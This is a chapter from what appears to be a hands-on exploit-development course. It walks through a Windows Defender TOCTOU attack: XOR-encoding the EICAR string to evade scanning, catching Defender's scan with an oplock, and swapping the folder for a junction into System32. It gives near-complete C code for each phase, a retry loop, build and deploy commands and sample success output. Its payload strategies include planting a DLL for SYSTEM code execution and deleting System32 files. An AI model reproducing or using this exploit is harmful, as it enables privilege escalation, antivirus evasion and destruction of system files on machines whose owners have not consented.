# Chapter 10 — The Full Kill Chain: Operations Order

## Operations Order — Force Overview

The complete weapon system is one C file that integrates all three subsystems into a single fire-and-forget platform. No external support, no logistics chain, no elevated clearance. One operator, one weapon, one trigger pull.

```
┌─────────────────────────────────────────────────────────┐
│                    vader_toctou.exe                       │
│                                                          │
│  BB1 Functions:  CreateJunction()                        │
│  BB2 Functions:  Oplock setup + wait                     │
│  BB3 Functions:  EICAR decode + trigger                  │
│                                                          │
│  New Logic:      Swap sequence                           │
│                  Error handling                           │
│                  Retry loop                               │
│                  Target selection                         │
└─────────────────────────────────────────────────────────┘
```

Three weapon subsystems — the junction mechanism (BB1), the observation post (BB2), and the bait trigger (BB3) — combined into one platform. Like assembling the upper receiver, lower receiver, and optic into a complete weapons system.

> **FIELD NOTE — WHAT THIS CHAPTER IS AND ISN'T**
>
> This chapter is the BLUEPRINT — the operations order that shows how all subsystems connect. The pseudocode here uses undefined helpers and simplified flows. It does not compile. The compilable weapon is in `BUILDING_BLOCKS/vader_toctou_annotated.c`. The version YOU write from scratch goes in `LIVE/`. This chapter teaches the WHY and the SEQUENCE. The building blocks teach the HOW.

## XOR Encoding — Camo Application

Before we step through the kill chain, we need to cover a piece of tradecraft that makes the entire operation possible: XOR encoding. It's referenced throughout the book but never explained. Time to fix that.

### Why We Apply Camo to the EICAR String

The EICAR test string is our blank round — a harmless signature that Defender treats as a live threat. We need it inside our binary so we can write it to disk at runtime. Problem: if we store EICAR as plaintext in the `.exe`'s `.rdata` section, Defender scans our binary itself during compilation, download, or file copy — and quarantines the weapon BEFORE it ever executes.

That's carrying a live grenade with the pin out. You detonate on the march to the objective. Mission over before it starts.

XOR encoding is the camouflage. The EICAR string gets encoded into a byte sequence that looks like meaningless data in static analysis. Defender inspects the binary, sees nothing recognisable, and waves it through. The string only gets decoded at runtime, on the stack, for the brief moment we need to write it to the bait file.

Static analysis = enemy weapons inspection at the checkpoint.
XOR-encoded data = disassembled weapon components, individually inert.
Runtime decode = field assembly past the checkpoint.

### How XOR Works — The Mechanism

XOR (exclusive OR) is a bitwise operation. Two inputs, one output. The truth table:

```
 A | B | A ^ B
---+---+-------
 0 | 0 |   0
 0 | 1 |   1
 1 | 0 |   1
 1 | 1 |   0
```

Same inputs → 0. Different inputs → 1. Simple as that.

The critical property: **applying the same key twice recovers the original.**

```
A ^ K = encoded
encoded ^ K = A
```

Or written out: `A ^ K ^ K = A`. The key is its own inverse. Encode and decode are the same operation.

We use single-byte XOR with key `0x42`. Every byte of the EICAR string gets XOR'd with `0x42` to produce the encoded array that lives in `.rdata`. At runtime, we XOR each byte with `0x42` again to recover the original.

### The Math — Character by Character

```
Character   ASCII Hex   Key    Encoded
─────────   ─────────   ────   ───────
'X'         0x58        0x42   0x1A      (0101 1000 ^ 0100 0010 = 0001 1010)
'5'         0x35        0x42   0x77      (0011 0101 ^ 0100 0010 = 0111 0111)
'O'         0x4F        0x42   0x0D      (0100 1111 ^ 0100 0010 = 0000 1101)
'!'         0x21        0x42   0x63      (0010 0001 ^ 0100 0010 = 0110 0011)
```

The encoded values — `0x1A, 0x77, 0x0D, 0x63` — look like random noise. No signature match. Defender walks right past.

### The Decode Function — Stripping Camo at Runtime

```c
void decode_eicar(char* out) {
    for (int i = 0; i < EICAR_LEN; i++) {
        out[i] = (char)(EICAR_XOR[i] ^ EICAR_KEY);
    }
    out[EICAR_LEN] = '\0';
}
```

`EICAR_XOR[]` is the encoded array in `.rdata`. `EICAR_KEY` is `0x42`. The loop XORs each byte, writing the decoded EICAR string into `out` — a buffer on the stack. The null terminator seals it.

The decoded EICAR string exists only on the STACK, only for the brief window between decode and `WriteFile`. It never touches `.rdata`. It never exists on disk in our binary. Concealed carry.

### Why Single-Byte XOR Is Sufficient — Don't Overthink It

This is not cryptography. This is concealment.

Defender scans FILES ON DISK, not process memory (at the real-time protection stage we're exploiting). The camo only needs to survive static analysis of the binary's `.rdata` section. Once the binary is running, Defender isn't reading our stack frames — it's watching for file writes, which is exactly what triggers the oplock.

A single-byte XOR with a fixed key would be trivial to break if someone was actively reversing the binary. But Defender isn't doing that. It's pattern-matching against known signatures. `0x1A 0x77 0x0D 0x63` doesn't match the EICAR signature. Mission accomplished.

Don't bring a cipher suite when a ghillie net will do.

### The Corruption Lesson — When the Blank Round Is a Dud

In an earlier version of the weapon, 22 of 68 bytes in the XOR array were corrupted. Bit 6 was flipped on every non-alphanumeric character — a systematic encoding error during array construction.

Result: the decoded string was gibberish. Not EICAR. Not anything Defender recognised. The bait file landed on disk and Defender completely ignored it. No scan. No oplock break. No swap opportunity. The entire kill chain was dead because the blank round was a dud.

This is why you ALWAYS verify the decoded output before deployment:

```c
decode_eicar(testBuf);
printf("Decoded EICAR: %s\n", testBuf);
// Must match: X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

If the decoded string doesn't match the real EICAR signature character-for-character, your weapon is loaded with duds. The kill chain is inert. Fix the array before you do anything else.

A dud round doesn't just miss — it gives you false confidence that the weapon system is broken when the problem was the ammunition all along.

## The Full Sequence — OPORD Execution

Here's the complete operation with every call, phase by phase:

```c
// ═══════════════════════════════════════════════════════════
// PHASE 1: SETUP — Establish the Forward Operating Base
// ═══════════════════════════════════════════════════════════

// 1. Establish the FOB in a random location within %TEMP%
//    e.g., C:\Users\REDACTED\AppData\Local\Temp\vader_8A3F\
GetTempPathW(MAX_PATH, tempBase);
wsprintfW(workDir, L"%svader_%04X", tempBase, GetTickCount() & 0xFFFF);
CreateDirectoryW(workDir, NULL);

// 2. Create the ambush site (this becomes the junction later)
//    e.g., C:\Users\...\Temp\vader_8A3F\cache\
wsprintfW(cacheDir, L"%s\\cache", workDir);
CreateDirectoryW(cacheDir, NULL);

// 3. Build the bait emplacement path
//    e.g., C:\Users\...\Temp\vader_8A3F\cache\bait.exe
wsprintfW(baitPath, L"%s\\bait.exe", cacheDir);


// ═══════════════════════════════════════════════════════════
// PHASE 2: TRIGGER — Emplace Bait and Set the Ambush
// ═══════════════════════════════════════════════════════════

// 4. Deploy the blank round (EICAR) to draw enemy response
//    XOR-decoded at runtime (so our binary isn't flagged in transit)
decode_eicar(eicarBuf);
hBait = CreateFileW(baitPath, GENERIC_WRITE,
                     FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                     NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
WriteFile(hBait, eicarBuf, EICAR_LEN, &written, NULL);
// DO NOT close hBait yet — Defender scans on handle close (IRP_MJ_CLEANUP).
// If we close now, Defender quarantines the bait before the oplock arms.

// 5. Establish observation post on the bait (OVERLAPPED = async)
//    Write handle still open — Defender defers scan while file is "in use"
hOplock = CreateFileW(baitPath, GENERIC_READ,
                       FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                       NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);

// 6. OP begins observation — request batch oplock
ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
DeviceIoControl(hOplock, FSCTL_REQUEST_BATCH_OPLOCK,
                NULL, 0, NULL, 0, NULL, &ov);
// Returns FALSE + ERROR_IO_PENDING = OP is active

// 7. NOW close the write handle — triggers Defender's deferred scan
//    Defender's scan fires INTO the armed oplock. Kernel freezes Defender.
CloseHandle(hBait);

// 8. Hold position — wait for enemy contact (oplock break)
WaitForSingleObject(ov.hEvent, 30000);


// ═══════════════════════════════════════════════════════════
// PHASE 3: SWAP — Execute the Ambush (speed is critical)
// ═══════════════════════════════════════════════════════════

// 9. Collapse the OP (release the file)
CloseHandle(hOplock);
CloseHandle(ov.hEvent);

// 10. Extract the bait (so the ambush site is clear)
DeleteFileW(baitPath);

// 11. Clear the ambush site (must be empty first)
RemoveDirectoryW(cacheDir);

// 12. Rebuild the position (empty, ready for junction)
CreateDirectoryW(cacheDir, NULL);

// 13. Replace the road signs: ambush site → target position
CreateJunction(cacheDir, L"C:\\Windows\\System32");

// Steps 9-13 take ~0.2ms total — fast air insertion
// Enemy gap is 15-50ms. We need 0.2ms. That's 30-250x headroom.
// Enemy's halted advance resumes and follows the new road signs


// ═══════════════════════════════════════════════════════════
// PHASE 4: VERIFY — Battle Damage Assessment
// ═══════════════════════════════════════════════════════════

// 14. Confirm rounds on target
//     (check if payload landed in the target position)
Sleep(1000);  // Allow the enemy to complete their action through the junction
if (GetFileAttributesW(L"C:\\Windows\\System32\\bait.exe")
    != INVALID_FILE_ATTRIBUTES) {
    // BDA POSITIVE — payload on target
}

// 15. Exfil — clean up the ambush site
RemoveDirectoryW(cacheDir);
RemoveDirectoryW(workDir);
```

## What Actually Lands on Target?

The battle damage depends on how the enemy executes their detention procedure. There are three observed behaviours:

### Behaviour A: Delete + Replace
The enemy deletes the flagged file and optionally replaces it with a quarantine stub. The DELETE operation follows the junction, deleting a file IN System32 (if one with the same name exists). This is a denial-of-service strike — destroying the enemy's own assets by redirecting their own ordnance.

### Behaviour B: Move/Copy
The enemy moves or copies the file to the quarantine folder. The move operation involves creating a new file at the quarantine path. If the enemy's internal procedure creates any temporary files in the same directory during processing, those land in System32. Collateral writes become our payload delivery.

### Behaviour C: Write Metadata
Some scan operations write metadata (timestamps, scan results) to the file or a sidecar file. These writes follow the junction — any data the enemy writes to the ambush site ends up on the target position.

The exact battle damage depends on the enemy's current version and the specific scan path triggered. Recon on the target machine will confirm which behaviour we observe.

## Payload Strategies — Warhead Selection

### Strategy 1: File Plant (Privilege Escalation)
Plant a DLL on the target position that a SYSTEM-level service will load:
1. Name our bait the same as a DLL that a service searches for
2. Junction redirects the enemy's write to the service's search path
3. Service loads our DLL → code execution as SYSTEM — full escalation

This requires intelligence on which DLLs services search for in exploitable locations. Common targets: DLLs loaded via `LoadLibrary` with relative paths.

```c
// Change the bait filename to a target DLL name:
#define BAIT_FILENAME   L"version.dll"

// Junction target: a directory where a SYSTEM service searches for DLLs
wcscpy(targetDir, L"C:\\ProgramData\\SomeService\\plugins");

// If the service calls LoadLibrary("version.dll") with a relative path,
// it searches the current directory and PATH. If we can land our DLL in
// a directory the service searches, we get code execution as SYSTEM.
```

### Strategy 2: File Delete (Denial of Service)
If the enemy's detention procedure deletes through the junction, we can destroy critical system files:
1. Name our bait the same as a critical system file
2. Junction redirects to System32
3. Enemy "quarantines" the flagged file → deletes the real system file

This proves the vulnerability even if we can't plant arbitrary files. Destruction is still a demonstrated effect.

```c
// Name the bait after a real System32 file:
#define BAIT_FILENAME   L"license.rtf"

// If Defender's quarantine procedure deletes the "infected" file,
// the delete follows the junction and removes:
//   C:\Windows\System32\license.rtf
// A standard user just deleted a system file via Defender's own hands.
//
// WARNING: This is destructive. Only use on YOUR test machine.
// For academic PoC, use Strategy 3 instead.
```

### Strategy 3: Proof of Concept (Safe Demonstration)
For assessment purposes, prove we can put rounds on a protected target:
1. Use a harmless filename (e.g., `vader_proof.txt`)
2. Junction to a test directory with elevated permissions
3. Demonstrate the file appeared where a standard user should never be able to write

```c
// Safe PoC: unique filename that won't collide with real system files
#define BAIT_FILENAME   L"vader_proof_20260613.txt"

// Target: any directory where standard users can't normally write
wcscpy(targetDir, L"C:\\Windows\\System32");

// BDA check — if this file exists, a standard user just wrote to System32:
//   dir C:\Windows\System32\vader_proof_20260613.txt
//
// Clean up after yourself:
//   (requires admin or another TOCTOU pass to delete from System32)
```

## Re-engagement Protocol (Retry Logic)

The ambush is reliable but not 100% guaranteed on every engagement. Sometimes the enemy scans faster than expected, or environmental friction adds latency. The weapon system should support re-engagement — multiple attempts on the same target:

```c
for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
    printf("[*] Attempt %d/%d\n", attempt + 1, MAX_ATTEMPTS);

    // Clean staging for each engagement
    setup_directories();

    // Emplace bait + establish OP
    write_bait();
    set_oplock();

    // Wait for enemy contact
    DWORD wait = WaitForSingleObject(ov.hEvent, 30000);  // 30-second timeout

    if (wait == WAIT_OBJECT_0) {
        // OP reports contact — execute the ambush
        do_swap();

        // Battle damage assessment
        if (verify_success()) {
            printf("[+] SUCCESS on attempt %d!\n", attempt + 1);
            break;
        }
    }

    // Break down and reset for next engagement
    cleanup();
    Sleep(500);  // Brief pause between attempts
}
```

Like re-engaging after a miss — reset, re-aim, fire again. Each attempt is a clean engagement with fresh staging.

## Weapon System Architecture

Your final weapon system is ONE self-contained .c file — no external dependencies, no logistics tail:

```
vader_toctou.c
├── #includes
├── REPARSE_MOUNT_POINT_BUFFER typedef
├── EICAR XOR data + decode function
├── CreateJunction() function (from BB1)
├── main()
│   ├── Setup phase (establish FOB)
│   ├── Re-engagement loop
│   │   ├── Trigger phase (emplace bait + set OP)
│   │   ├── Swap phase (execute ambush)
│   │   └── Verify phase (BDA)
│   └── Exfil (cleanup)
```

No external dependencies. Compiles with one `cl.exe` command. Links only against `kernel32.lib` (automatic, standard). The weapon system carries everything it needs.

## Weapons Assembly and Forward Deployment

```cmd
:: On YOUR machine (assembly):
cl.exe vader_toctou.c /Fe:vader_toctou.exe /O1 /GS-

:: Forward deploy to target (REDACTED test laptop):
:: USB, network share, or whatever method is available

:: On the TARGET machine (as standard user — no admin):
vader_toctou.exe
```

## Battle Damage Assessment — What Success Looks Like

```
[*] VADER TOCTOU Exploit v1.0
[*] Working directory: C:\Users\REDACTED\AppData\Local\Temp\vader_A3F2\
[*] Target: C:\Windows\System32
[*] Attempt 1/5
[*] Bait written. Setting oplock...
[*] Waiting for Defender RTP...
[+] Oplock broken! Response time: 18.42ms
[*] Executing swap...
[*] Handle closed.        (0.01ms)
[*] Bait deleted.         (0.04ms)
[*] Directory removed.    (0.03ms)
[*] Directory recreated.  (0.02ms)
[*] Junction set.         (0.08ms)
[*] Total swap time:      0.18ms
[*] Verifying...
[+] ════════════════════════════════════
[+]  SUCCESS — File written to System32
[+]  Proof: C:\Windows\System32\bait.exe exists
[+]  Written by: SYSTEM (via Defender quarantine)
[+]  Our user: REDACTED (standard, no admin)
[+] ════════════════════════════════════
[*] Cleaning up...
[+] Done.
```

Rounds on target. A standard user with no admin privileges just wrote to System32 by redirecting the enemy's own firepower. The enemy's SYSTEM-level access became our delivery mechanism.

## Your Training Progression

1. ✅ Read Chapters 1-9 (you're here — recon and theory complete)
2. ⬜ Run all test programs (TESTS/) — dry fire drills
3. ⬜ Study the building blocks (BUILDING_BLOCKS/) — strip and clean each subsystem
4. ⬜ Write bb1_junction.c in LIVE/ (guided) — assemble the junction mechanism
5. ⬜ Write bb2_oplock.c in LIVE/ (guided) — build the observation post
6. ⬜ Write bb3_trigger.c in LIVE/ (guided) — construct the trigger system
7. ⬜ Write vader_toctou.c in LIVE/ (the full weapon system) — final assembly
8. ⬜ Test on YOUR machine first (controlled range, known environment)
9. ⬜ Forward deploy to REDACTED test laptop (live fire)
10. ⬜ Document results in after-action report
